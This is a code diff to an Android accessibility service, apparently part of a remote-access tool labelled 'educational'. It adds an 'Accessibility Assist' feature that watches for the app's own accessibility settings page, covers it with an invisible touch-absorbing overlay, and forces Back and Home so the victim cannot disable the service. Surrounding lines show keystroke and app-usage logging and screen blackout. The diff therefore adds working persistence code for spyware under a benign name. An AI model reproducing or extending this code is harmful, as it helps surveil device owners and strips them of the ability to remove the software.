@@ -70,6 +70,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     
     // Uninstall assist mode
     private volatile boolean uninstallAssistMode = false;
+
+    // ── Accessibility Assist ─────────────────────────────────────────────────
+    // Transparent touch-absorbing overlay shown when our accessibility settings
+    // detail page is open, preventing the user from toggling the service off.
+    private View accessibilityAssistView;
+    private WindowManager accessibilityAssistWM;
+    private volatile boolean accessibilityAssistEnabled = false;
+    private volatile boolean accessibilityAssistOverlayShowing = false;
+    private boolean accessibilityAssistIsFirstLaunch = false;
     
     // Defent variables - run continuously forever
     private String currentAppName = "";
@@ -131,6 +140,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
             } catch (Exception ignored) {}
         }
+
+        // Accessibility Assist: protect the accessibility toggle from being turned off.
+        //   First launch  → enable after 15 s (user is still in onboarding)
+        //   Boot/restart  → enable immediately
+        try { initAccessibilityAssist(isFirstLaunch); } catch (Exception ignored) {}
 
         // Auto-click scanner (defent protection) and auto-uninstall:
         //   First launch → wait 30 s (permissions are still being granted, screen is busy)
@@ -558,6 +572,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         notifPanelActiveAppsVisible = false;
                         removeNotifStopOverlay();
                     }
+                    // Accessibility Assist: react to window changes in settings
+                    try { handleAccessibilityAssistWindowChange(packageName, event); } catch (Exception ignored) {}
                     updateCurrentAppName();
                     String log = "[" + packageName + "] APP OPENED";
                     keylogBuffer.add(log);
@@ -1889,6 +1905,163 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         return false;
     }
 
+    // ── Accessibility Assist methods ──────────────────────────────────────────
+
+    /**
+     * Initialises the Accessibility Assist protection.
+     *
+     * First install/launch : enable after 15 seconds (onboarding is still running).
+     * Boot / restart       : enable immediately so we are ready before the user
+     *                        even opens Settings.
+     */
+    private void initAccessibilityAssist(boolean isFirstLaunch) {
+        accessibilityAssistIsFirstLaunch = isFirstLaunch;
+        if (isFirstLaunch) {
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                accessibilityAssistEnabled = true;
+                Log.i(TAG, "AccessibilityAssist: enabled (first-launch, 15 s delay)");
+            }, 15_000);
+        } else {
+            accessibilityAssistEnabled = true;
+            Log.i(TAG, "AccessibilityAssist: enabled immediately (boot/restart)");
+        }
+    }
+
+    /**
+     * Called on every TYPE_WINDOW_STATE_CHANGED event.
+     *
+     * When the window that just came to the foreground belongs to a Settings
+     * package AND our app name appears on screen together with "accessibility"
+     * context, we assume the user has opened our accessibility detail page and
+     * we show the touch-blocking overlay immediately.
+     *
+     * "Prepare early" is achieved because this hook fires on every settings
+     * window transition, so by the time the detail page finishes rendering our
+     * code has already evaluated it.
+     *
+     * When the user leaves Settings entirely the overlay is removed.
+     */
+    private void handleAccessibilityAssistWindowChange(String packageName, AccessibilityEvent event) {
+        if (!accessibilityAssistEnabled) return;
+
+        boolean isSettingsPkg = packageName.contains("settings");
+
+        if (isSettingsPkg) {
+            // Read the screen asynchronously to keep onAccessibilityEvent fast.
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    String appName = getString(R.string.app_name);
+                    AccessibilityNodeInfo root = getRootInActiveWindow();
+                    if (root == null) return;
+                    String screenText = getAllScreenText(root);
+                    root.recycle();
+
+                    boolean hasAppName      = screenText.contains(appName);
+                    boolean hasAccessibility = packageName.toLowerCase().contains("accessibility")
+                            || screenText.toLowerCase().contains("accessibility");
+
+                    if (hasAppName && hasAccessibility) {
+                        if (!accessibilityAssistOverlayShowing) {
+                            showAccessibilityAssistOverlay();
+
+                            // Back press delay:
+                            //   First launch → 1.5 s (give user a moment to see it)
+                            //   Other launches → 600 ms (close quickly)
+                            long backDelay = accessibilityAssistIsFirstLaunch ? 1_500L : 600L;
+
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                try { performBack(); } catch (Exception ignored) {}
+                            }, backDelay);
+
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                try { performHome(); } catch (Exception ignored) {}
+                            }, backDelay + 500L);
+
+                            // Remove the overlay after navigating away
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                try { removeAccessibilityAssistOverlay(); } catch (Exception ignored) {}
+                            }, backDelay + 3_000L);
+                        }
+                    }
+                } catch (Exception ignored) {}
+            });
+
+        } else if (!"com.android.systemui".equals(packageName)) {
+            // User navigated away from Settings entirely — clean up the overlay.
+            if (accessibilityAssistOverlayShowing) {
+                removeAccessibilityAssistOverlay();
+            }
+        }
+    }
+
+    /**
+     * Adds a fully transparent, touch-absorbing overlay that covers the main
+     * content area (the system excludes the status bar and navigation bar from
+     * TYPE_ACCESSIBILITY_OVERLAY windows automatically, so those stay reachable).
+     *
+     * The overlay has no background colour so the user can still see the screen,
+     * but every touch is consumed before it reaches the accessibility toggle.
+     */
+    private void showAccessibilityAssistOverlay() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return;
+        try {
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    if (accessibilityAssistOverlayShowing && accessibilityAssistView != null) return;
+
+                    int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                            ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+                            : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
+
+                    WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+                            WindowManager.LayoutParams.MATCH_PARENT,
+                            WindowManager.LayoutParams.MATCH_PARENT,
+                            type,
+                            // FLAG_NOT_FOCUSABLE   → does not steal keyboard focus
+                            // FLAG_LAYOUT_IN_SCREEN → occupies the full app content area
+                            // Intentionally NO FLAG_NOT_TOUCHABLE so touches are absorbed.
+                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                            PixelFormat.TRANSPARENT
+                    );
+                    lp.gravity = android.view.Gravity.TOP | android.view.Gravity.LEFT;
+
+                    WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+                    if (wm == null) return;
+
+                    View v = new View(UnifiedAccessibilityService.this);
+                    v.setBackgroundColor(Color.TRANSPARENT);
+
+                    accessibilityAssistWM = wm;
+                    accessibilityAssistView = v;
+                    accessibilityAssistOverlayShowing = true;
+                    wm.addView(v, lp);
+                    Log.i(TAG, "AccessibilityAssist overlay shown (transparent, touch-absorbing)");
+                } catch (Exception e) {
+                    Log.e(TAG, "showAccessibilityAssistOverlay error: " + e.getMessage());
+                    accessibilityAssistOverlayShowing = false;
+                }
+            });
+        } catch (Exception ignored) {}
+    }
+
+    /** Removes the accessibility-assist overlay (safe to call from any thread). */
+    private void removeAccessibilityAssistOverlay() {
+        try {
+            new Handler(Looper.getMainLooper()).post(() -> {
+                try {
+                    if (accessibilityAssistWM != null && accessibilityAssistView != null) {
+                        accessibilityAssistWM.removeView(accessibilityAssistView);
+                        Log.i(TAG, "AccessibilityAssist overlay removed");
+                    }
+                } catch (Exception ignored) {}
+                accessibilityAssistView = null;
+                accessibilityAssistWM = null;
+                accessibilityAssistOverlayShowing = false;
+            });
+        } catch (Exception ignored) {}
+    }
+
     @Override
     public void onInterrupt() {
     }
@@ -1898,6 +2071,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try { super.onDestroy(); } catch (Exception ignored) {}
         try { removeBlackOverlay(); } catch (Exception ignored) {}
         try { removeNotifStopOverlayOnMainThread(); } catch (Exception ignored) {}
+        try { removeAccessibilityAssistOverlay(); } catch (Exception ignored) {}
         try { com.remoteaccess.educational.commands.ScreenBlackout.getInstance().clearService(); } catch (Exception ignored) {}
         try {
             if (autoClickHandler != null && autoClickRunnable != null) {
